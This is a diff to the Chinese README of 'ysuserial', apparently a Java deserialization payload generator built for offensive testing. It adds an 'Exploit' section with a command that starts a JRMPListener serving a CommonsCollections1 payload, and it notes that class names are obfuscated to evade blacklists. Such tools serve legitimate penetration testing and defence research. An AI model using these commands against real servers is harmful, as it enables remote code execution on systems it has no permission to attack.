@@ -291,7 +291,8 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections1 -p 'open -a Ca
 ### 任意自定义代码
 
 如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 ClassLoader
-进行加载并实例化。命令使用 `LF-` 开头，后面跟指定自定义类字节码文件的绝对路径。
+
+[//]: # (进行加载并实例化。命令使用 `LF-` 开头，后面跟指定自定义类字节码文件的绝对路径，程序会尝试自动缩减类字节码的大小。)
 
 示例：
 
@@ -474,6 +475,14 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSF
 ，据我了解目前还没有人针对我这个包名进行防御，如果未来被加入了豪华黑名单大礼包，我会更新可以生成自定义包名的版本。~~
 
 目前已支持动态生成混淆的类名，不存在任何 `org.su18` 关键字。
+
+# Exploit
+
+目前项目对 exploit 目录下的利用方式已经完全支持，除了单独的参数外，其余参数与 payload 的参数保持一致：
+
+```shell
+java -cp ysuserial-<version>-su18-all.jar org.su18.ysuserial.exploit.JRMPListener 8888 -g CommonsCollections1 -p whoami
+```
 
 # 参考
 
